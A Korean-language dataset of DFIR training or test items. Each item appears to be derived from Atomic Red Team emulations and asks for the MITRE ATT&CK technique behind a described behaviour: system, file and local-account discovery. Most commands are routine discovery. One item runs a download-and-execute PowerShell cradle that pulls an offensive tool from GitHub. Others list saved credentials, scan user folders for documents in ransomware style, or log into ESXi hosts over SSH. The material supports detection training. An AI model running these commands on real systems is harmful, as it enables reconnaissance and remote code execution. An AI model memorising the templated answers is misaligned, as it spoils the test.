{"id": "T1082_T1082-15_Q15", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1082 System Information Discovery (Tactic: Discovery)\n[요약] Seatbelt를 호출해 브라우저, 크리덴셜, 로깅 설정 등 다양한 보안 관련 정보를 수집하는 정찰 동작을 모사한다.\n[절차] Invoke-Seatbelt.ps1을 GitHub에서 다운로드해 PowerShell로 로드한다. Invoke-Seatbelt -Command \"-group=all\"로 모든 그룹 체크를 수행한다.\n[대표 명령 예시]\n$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1'); Invoke-Seatbelt -Command \"-group=all\"", "answer": "이 행위는 MITRE ATT&CK의 T1082 \"System Information Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1082_T1082-16_Q16", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1082 System Information Discovery (Tactic: Discovery)\n[요약] WMIC와 Get-WmiObject를 사용해 CPU, 메모리, 메인보드, BIOS, GPU, OS, 디스크 정보를 상세하게 조회하는 정찰 동작을 모사한다.\n[절차] WMIC 명령으로 CPU, 메모리, 보드, BIOS, GPU, OS, 디스크 정보를 각각 조회한다. 마지막으로 PowerShell에서 Get-WmiObject win32_bios를 실행해 BIOS 객체를 확인한다.\n[대표 명령 예시]\nwmic cpu get name & wmic MEMPHYSICAL get MaxCapacity & wmic baseboard get product & wmic baseboard get version & wmic bios get SMBIOSBIOSVersion & wmic path win32_VideoController get name & wmic path win32_VideoController get DriverVersion & wmic path win32_VideoController get VideoModeDescription & wmic OS get Caption,OSArchitecture,Version & wmic DISKDRIVE get Caption & powershell -c \"Get-WmiObject win32_bios\"", "answer": "이 행위는 MITRE ATT&CK의 T1082 \"System Information Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1082_T1082-17_Q17", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1082 System Information Discovery (Tactic: Discovery)\n[요약] 기본 제공 스크립트 gathernetworkinfo.vbs를 실행해 OS, DNS, 방화벽, 네트워크 구성 정보를 수집하는 동작을 모사한다.\n[절차] C:\\Windows\\System32\\gatherNetworkInfo.vbs 파일이 존재하는지 확인한다. 관리자 권한으로 wscript.exe C:\\Windows\\System32\\gatherNetworkInfo.vbs를 실행한다.\n[대표 명령 예시]\nwscript.exe C:\\Windows\\System32\\gatherNetworkInfo.vbs", "answer": "이 행위는 MITRE ATT&CK의 T1082 \"System Information Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1082_T1082-18_Q18", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1082 System Information Discovery (Tactic: Discovery)\n[요약] HKCU 국제 설정 Geo 키를 조회해 시스템에 설정된 국가 코드 정보를 확인하는 지오펜스 관련 정찰 동작을 모사한다.\n[절차] reg query로 HKEY_CURRENT_USER\\Control Panel\\International\\Geo 키를 조회한다. Nation 등 값을 통해 국가 코드를 파악한다.\n[대표 명령 예시]\nreg query \"HKEY_CURRENT_USER\\Control Panel\\International\\Geo\"", "answer": "이 행위는 MITRE ATT&CK의 T1082 \"System Information Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1082_T1082-19_Q19", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1082 System Information Discovery (Tactic: Discovery)\n[요약] HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System에서 BIOS 및 Video BIOS 버전을 조회해 가상화·샌드박스 탐지 등에 활용 가능한 정보를 수집하는 동작을 모사한다.\n[절차] reg query로 SystemBiosVersion 값을 조회한다. reg query로 VideoBiosVersion 값을 조회한다.\n[대표 명령 예시]\nreg query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System /v SystemBiosVersion & reg query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System /v VideoBiosVersion", "answer": "이 행위는 MITRE ATT&CK의 T1082 \"System Information Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1082_T1082-20_Q20", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1082 System Information Discovery (Tactic: Discovery)\n[요약] Windows에서 plink.exe로 ESXi 서버에 SSH 접속 후 esx_vmdiscovery.txt에 정의된 ESXCLI 명령을 실행해 VM 목록을 수집하는 동작을 모사한다.\n[절차] PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe가 존재하는지 확인한다. 없을 경우 원격에서 plink.exe를 다운로드한다. plink -ssh -l <user> -pw <pass> -m esx_vmdiscovery.txt로 ESXCLI 스크립트를 실행한다.\n[대표 명령 예시]\necho \"\" | #{plink_file} #{vm_host} -ssh -l #{vm_user} -pw #{vm_pass} -m #{cli_script}", "answer": "이 행위는 MITRE ATT&CK의 T1082 \"System Information Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1082_T1082-21_Q21", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1082 System Information Discovery (Tactic: Discovery)\n[요약] Darkside 랜섬웨어가 사용한 것과 유사한 ESXCLI 명령을 esx_darkside_discovery.txt로 실행해 ESXi 호스트 정보를 수집하는 동작을 모사한다.\n[절차] PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe를 준비한다. esx_darkside_discovery.txt에 Darkside에서 사용한 ESXCLI 명령을 포함시킨다. plink -ssh -l <user> -pw <pass> -m esx_darkside_discovery.txt 명령을 실행한다.\n[대표 명령 예시]\necho \"\" | #{plink_file} #{vm_host} -ssh -l #{vm_user} -pw #{vm_pass} -m #{cli_script}", "answer": "이 행위는 MITRE ATT&CK의 T1082 \"System Information Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1082_T1082-22_Q22", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1082 System Information Discovery (Tactic: Discovery)\n[요약] PowerShell Get-CimInstance Win32_OperatingSystem을 사용해 OS 이름, 버전, 서비스팩, 아키텍처, 컴퓨터 이름, Windows 디렉터리를 조회하는 정찰 동작을 모사한다.\n[절차] PowerShell에서 Win32_OperatingSystem CIM 클래스를 조회한다. Caption, Version, ServicePackMajorVersion, OSArchitecture, CSName, WindowsDirectory 필드를 선택한다.\n[대표 명령 예시]\nGet-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, ServicePackMajorVersion, OSArchitecture, CSName, WindowsDirectory | Out-Null", "answer": "이 행위는 MITRE ATT&CK의 T1082 \"System Information Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1082_T1082-23_Q23", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1082 System Information Discovery (Tactic: Discovery)\n[요약] CMD의 ver 명령을 사용해 Windows 버전을 간단히 확인하는 정찰 동작을 모사한다.\n[절차] cmd.exe에서 ver 명령을 실행한다. 출력된 OS 버전 문자열을 확인한다.\n[대표 명령 예시]\nver", "answer": "이 행위는 MITRE ATT&CK의 T1082 \"System Information Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1082_T1082-24_Q24", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1082 System Information Discovery (Tactic: Discovery)\n[요약] vssadmin.exe list shadows를 사용해 시스템에 존재하는 볼륨 섀도 복사본과 생성 시각, 위치를 열람하는 동작을 모사한다.\n[절차] 관리자 권한으로 CMD를 실행한다. vssadmin.exe list shadows 명령을 수행한다. 출력된 각 섀도 복사본의 정보(볼륨, 생성 시각 등)를 확인한다.\n[대표 명령 예시]\nvssadmin.exe list shadows", "answer": "이 행위는 MITRE ATT&CK의 T1082 \"System Information Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1082_T1082-25_Q25", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1082 System Information Discovery (Tactic: Discovery)\n[요약] Get-Culture 결과를 %TMP%\\a.txt에 저장해 시스템의 문화권/언어 설정을 수집하는 동작을 모사한다.\n[절차] CMD에서 powershell.exe -c 'Get-Culture | Format-List | Out-File -FilePath %TMP%\\a.txt'를 실행한다. TMP 디렉터리에 생성된 a.txt를 통해 언어·지역 설정을 확인한다.\n[대표 명령 예시]\npowershell.exe -c 'Get-Culture | Format-List | Out-File -FilePath %TMP%\\a.txt'", "answer": "이 행위는 MITRE ATT&CK의 T1082 \"System Information Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1082_T1082-26_Q26", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1082 System Information Discovery (Tactic: Discovery)\n[요약] PowerShell gdr -PSProvider 'FileSystem' 명령을 사용해 시스템에 연결된 파일 시스템 드라이브 목록을 조회하는 동작을 모사한다.\n[절차] CMD에서 powershell.exe -c 'gdr -PSProvider \"FileSystem\"'을 실행한다. 결과로 출력되는 드라이브 문자와 경로를 확인한다.\n[대표 명령 예시]\npowershell.exe -c \"gdr -PSProvider 'FileSystem'\"", "answer": "이 행위는 MITRE ATT&CK의 T1082 \"System Information Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1082_T1082-27_Q27", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1082 System Information Discovery (Tactic: Discovery)\n[요약] HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion 키의 ProductName 값을 조회해 OS 에디션 이름을 확인하는 동작을 모사한다.\n[절차] reg query로 CurrentVersion 키의 ProductName 값을 조회한다. 출력된 제품명을 통해 OS 종류를 식별한다.\n[대표 명령 예시]\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v ProductName", "answer": "이 행위는 MITRE ATT&CK의 T1082 \"System Information Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1082_T1082-28_Q28", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1082 System Information Discovery (Tactic: Discovery)\n[요약] 같은 CurrentVersion 키에서 CurrentBuildNumber 값을 조회해 OS 빌드 번호를 확인하는 동작을 모사한다.\n[절차] reg query로 CurrentBuildNumber 값을 조회한다. 빌드 번호를 기준으로 취약 버전 여부를 판단할 수 있다.\n[대표 명령 예시]\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v CurrentBuildNumber", "answer": "이 행위는 MITRE ATT&CK의 T1082 \"System Information Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1083_T1083-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1083 File and Directory Discovery (Tactic: Discovery)\n[요약] cmd.exe의 dir 및 tree 명령을 사용해 C:\\ 전체와 주요 사용자 디렉터리를 재귀적으로 열거하고, 결과를 하나의 출력 파일에 저장한다. 랜섬웨어나 정보수집형 악성코드의 초기 자산/파일 스캔 행위를 모사한다.\n[절차] 결과를 기록할 출력 파일 경로(#{output_file})를 결정한다. C:\\ 루트, Program Files, Documents and Settings, Users, Recent, Desktop 등의 디렉터리에 대해 dir /s 명령을 실행한다. tree /F 명령을 통해 전체 디렉터리/파일 트리를 추가로 덤프한다. 모든 결과를 동일한 출력 파일에 리다이렉션하여 저장한다.\n[대표 명령 예시]\ndir /s c:\\ >> #{output_file}\ndir /s \"c:\\Documents and Settings\" >> #{output_file}\ndir /s \"c:\\Program Files\\\" >> #{output_file}\ndir \"%systemdrive%\\Users\\*.*\" >> #{output_file}\ndir \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.*\" >> #{output_file}\ndir \"%userprofile%\\Desktop\\*.*\" >> #{output_file}\ntree /F >> #{output_file}", "answer": "이 행위는 MITRE ATT&CK의 T1083 \"File and Directory Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1083_T1083-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1083 File and Directory Discovery (Tactic: Discovery)\n[요약] PowerShell의 ls, Get-ChildItem, gci 명령을 재귀 옵션과 함께 실행해 현재 위치 기준으로 하위 디렉터리와 파일을 모두 열거한다. 별도의 파일 출력 없이 콘솔에 결과를 표시한다.\n[절차] PowerShell 세션을 시작한다. 현재 디렉터리를 기준으로 ls -recurse를 실행해 모든 하위 파일/폴더를 나열한다. 추가적으로 get-childitem -recurse 및 gci -recurse를 실행해 동일한 범위에 대해 반복 열거를 수행한다. 콘솔 출력 또는 로깅을 통해 파일 및 디렉터리 구조를 확인한다.\n[대표 명령 예시]\nls -recurse\nget-childitem -recurse\ngci -recurse", "answer": "이 행위는 MITRE ATT&CK의 T1083 \"File and Directory Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1083_T1083-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1083 File and Directory Discovery (Tactic: Discovery)\n[요약] MAZE 랜섬웨어가 수행하는 디렉터리 열거 행위를 PowerShell로 모사한다. Program Files, Program Files (x86), 사용자 프로필 및 Desktop/Downloads/Documents/AppData 등 주요 사용자 폴더를 대상으로 재귀 열거를 수행하고 결과를 지정된 파일에 저장한다.\n[절차] 출력 파일 경로(#{File_to_output}, 기본값: $env:temp\\T1083Test5.txt)를 설정한다. 홈 드라이브 루트와 Program Files, Program Files(x86) 경로에 대해 Get-ChildItem을 실행하고 Out-File로 결과를 누적 기록한다. Users 폴더 내 각 사용자 하위 폴더에 대해 Desktop, Downloads, Documents, AppData/Local, AppData/Roaming 디렉터리를 순회하며 Get-ChildItem으로 파일/폴더를 열거한다. 완료 후 cat 명령으로 출력 파일 내용을 콘솔에 표시한다.\n[대표 명령 예시]\n$folderarray = @(\"Desktop\", \"Downloads\", \"Documents\", \"AppData/Local\", \"AppData/Roaming\")\nGet-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue | Out-File -append #{File_to_output}\nGet-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append #{File_to_output}\nGet-ChildItem -Path \"${env:ProgramFiles(x86)}\" -erroraction silentlycontinue | Out-File -append #{File_to_output}\n$UsersFolder = \"$env:homedrive\\Users\\\"\nforeach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue)\n{\nforeach ($secondarydirectory in $folderarray)\n {Get-ChildItem -Path \"$UsersFolder/$directory/$secondarydirectory\" -ErrorAction SilentlyContinue | Out-File -append #{File_to_output}}\n}\ncat #{File_to_output}", "answer": "이 행위는 MITRE ATT&CK의 T1083 \"File and Directory Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1083_T1083-4_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1083 File and Directory Discovery (Tactic: Discovery)\n[요약] BlackCat 랜섬웨어에서 관찰된 DirLister.exe 도구 실행 행위를 모사한다. DirLister를 짧은 시간 실행한 뒤 프로세스를 종료해, 외부 디렉터리 열거 도구 사용 여부를 탐지·분석할 수 있게 한다.\n[절차] 사전 조건으로 지정된 경로(#{dirlister_path})에 DirLister.exe가 존재하는지 확인한다. 없을 경우 GitHub 릴리스를 다운로드하고 압축 해제 후 대상 경로로 복사한다. PowerShell에서 Start-Process를 사용해 DirLister.exe를 실행한다. 일정 시간(예: 4초) 대기 후 Stop-Process -Name \"DirLister\"로 프로세스를 종료한다.\n[대표 명령 예시]\nStart-Process \"#{dirlister_path}\"\nStart-Sleep -Second 4\nStop-Process -Name \"DirLister\"", "answer": "이 행위는 MITRE ATT&CK의 T1083 \"File and Directory Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1083_T1083-5_Q5", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1083 File and Directory Discovery (Tactic: Discovery)\n[요약] Windows 시스템에서 plink.exe(SSH 클라이언트)를 이용해 ESXi 호스트에 비대화형 SSH 접속을 수행하고, 사전에 정의된 스크립트(cli_script)를 통해 VMDK 파일을 포함한 ESXi 파일 시스템을 열거한다.\n[절차] 사전 조건으로 plink.exe가 지정된 경로(#{plink_file})에 존재하는지 확인한다. 필요 시 Atomic 테스트의 get_prereq 단계를 통해 plink.exe를 다운로드한다. Windows에서 plink.exe를 실행해 지정된 ESXi 호스트(vm_host)에 SSH로 접속한다. 인증 정보(vm_user, vm_pass)를 사용해 로그인 후, cli_script에 정의된 파일 검색/열거 명령을 실행한다.\n[대표 명령 예시]\necho \"\" | \"#{plink_file}\" \"#{vm_host}\" -ssh  -l \"#{vm_user}\" -pw \"#{vm_pass}\" -m \"#{cli_script}\"", "answer": "이 행위는 MITRE ATT&CK의 T1083 \"File and Directory Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1083_T1083-6_Q6", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1083 File and Directory Discovery (Tactic: Discovery)\n[요약] 사용자 프로필 하위의 Documents, Downloads, Desktop, OneDrive 등 일반적으로 민감한 문서가 저장되는 폴더를 대상으로, 특정 확장자(.pdf, .docx, .zip 등)의 파일을 재귀적으로 검색한다. 결과는 크기, 수정 시간과 함께 하나의 로그 파일에 저장된다.\n[절차] 출력 파일 경로(#{output_file}, 기본값: $env:TEMP\\T1083-Enumerate-net.txt)를 설정한다. 관심 디렉터리 목록(Documents, Downloads, Desktop, OneDrive)과 대상 확장자 목록(.pdf, .docx 등)을 정의한다. 사용자 프로필 하위 디렉터리를 순회하며, 대상 디렉터리 이름이 포함된 경로에 대해서만 파일을 재귀적으로 열거한다. 확장자와 일치하는 파일에 대해 경로, 크기, 마지막 수정 시간을 문자열로 기록한다. 권한 부족/오류 발생 시 해당 경로와 에러 유형을 태그(AccessDenied, Error)와 함께 결과 리스트에 추가한다. 최종적으로 결과 리스트를 출력 파일에 UTF-8 인코딩으로 저장한다.\n[대표 명령 예시]\n$out = \"#{output_file}\"\n$dirsFilter = @('Documents','Downloads','Desktop','OneDrive')\n$exts = @('.pdf','.doc','.docx','.xls','.xlsx','.txt','.zip','.rar','.7z')\n$userProfile = [Environment]::GetFolderPath('UserProfile')\n$tr = [System.Collections.Generic.List[string]]::new()\n\nfunction MatchesExtension($path) {\n  try {\n    $e = [System.IO.Path]::GetExtension($path).ToLower()\n    return $exts -contains $e\n  } catch { return $false }\n}\n\nfunction Scan-Dir($root) {\n  try {\n    $match = $false\n    foreach ($f in $dirsFilter) { if ($root -like \"*$f*\") { $match = $true; break } }\n    if (-not $match) { return }\n\n    [System.IO.Directory]::EnumerateFiles($root) | ForEach-Object {\n      if (MatchesExtension $_) {\n        $fi = [System.IO.FileInfo]::new($_)\n        $tr.Add(\"[File] $_ Size:$($fi.Length) LastWrite:$($fi.LastWriteTime)\")\n      }\n    }\n\n    [System.IO.Directory]::EnumerateDirectories($root) | ForEach-Object {\n      Scan-Dir $_\n    }\n  } catch [System.UnauthorizedAccessException] {\n    $tr.Add(\"[AccessDenied] $root\")\n  } catch {\n    $tr.Add(\"[Error] $root => $($_.Exception.Message)\")\n  }\n}\n\n[System.IO.Directory]::EnumerateDirectories($userProfile) | ForEach-Object { Scan-Dir $_ }\n\n$outDir = [System.IO.Path]::GetDirectoryName($out)\nif (-not [string]::IsNullOrEmpty($outDir) -and -not (Test-Path $outDir)) {\n  New-Item -Path $outDir -ItemType Directory -Force | Out-Null\n}\n\n$tr | Out-File -FilePath $out -Encoding UTF8\nWrite-Output \"Enumeration complete. Results written to: $out\"", "answer": "이 행위는 MITRE ATT&CK의 T1083 \"File and Directory Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1087.001_T1087.001-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1087.001 Account Discovery: Local Account (Tactic: Discovery)\n[요약] net 명령과 cmdkey, C:\\Users 디렉터리 열거를 통해 로컬 계정 목록, 사용자 프로필 디렉터리, 저장된 자격 증명, 로컬 그룹 정보를 한 번에 수집한다. 권한 상승이나 추가 피벗을 위한 계정·그룹 구조 파악 행동을 모사한다.\n[절차] cmd.exe 세션에서 net user를 실행해 로컬 사용자 계정 목록을 확인한다. C:\\Users\\ 디렉터리를 dir 명령으로 열거해 실제 사용자 프로필 폴더를 확인한다. cmdkey.exe /list를 통해 저장된 자격 증명(저장된 크리덴셜)을 열거한다. net localgroup \"Users\" 명령으로 Users 그룹 구성원을 조회한다. net localgroup 명령으로 로컬 시스템의 전체 그룹 목록을 확인한다.\n[대표 명령 예시]\nnet user\ndir c:\\Users\\\ncmdkey.exe /list\nnet localgroup \"Users\"\nnet localgroup", "answer": "이 행위는 MITRE ATT&CK의 T1087.001 \"Account Discovery: Local Account\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1087.001_T1087.001-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1087.001 Account Discovery: Local Account (Tactic: Discovery)\n[요약] PowerShell과 net, cmdkey, 파일 시스템 열거를 조합해 로컬 사용자 계정, 그룹, 그룹 구성원, 저장된 자격 증명, 사용자 프로필 디렉터리를 폭넓게 수집한다. 계정 구조 및 권한 관계를 상세히 파악하는 탐색 행위를 시뮬레이션한다.\n[절차] PowerShell 세션에서 net user를 실행해 로컬 사용자 계정 목록을 확인한다. get-localuser를 사용해 로컬 사용자 계정의 상세 정보를 확인한다. get-localgroupmember -group Users로 Users 그룹 멤버를 열거한다. cmdkey.exe /list로 저장된 자격 증명을 확인한다. ls/get-childitem/dir 명령으로 C:\\Users\\ 디렉터리 및 하위 폴더를 열거한다. get-localgroup와 net localgroup으로 로컬 그룹 목록을 중복 확인한다.\n[대표 명령 예시]\nnet user\nget-localuser\nget-localgroupmember -group Users\ncmdkey.exe /list\nls C:/Users\nget-childitem C:\\Users\\\ndir C:\\Users\\\nget-localgroup\nnet localgroup", "answer": "이 행위는 MITRE ATT&CK의 T1087.001 \"Account Discovery: Local Account\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1087.001_T1087.001-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1087.001 Account Discovery: Local Account (Tactic: Discovery)\n[요약] query user 명령을 사용해 현재 시스템에 로그인한 사용자 세션을 열거한다. 터미널 세션, RDP 세션 등 활성/비활성 사용자 세션 정보를 확인하는 활동을 모사한다.\n[절차] cmd.exe 세션을 연다. query user 명령을 실행해 현재 로그인된 사용자 세션 목록을 조회한다. 출력 결과의 사용자 이름, 세션 이름, ID, 상태(Active/Disc) 및 로그인 시간 정보를 확인한다.\n[대표 명령 예시]\nquery user", "answer": "이 행위는 MITRE ATT&CK의 T1087.001 \"Account Discovery: Local Account\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
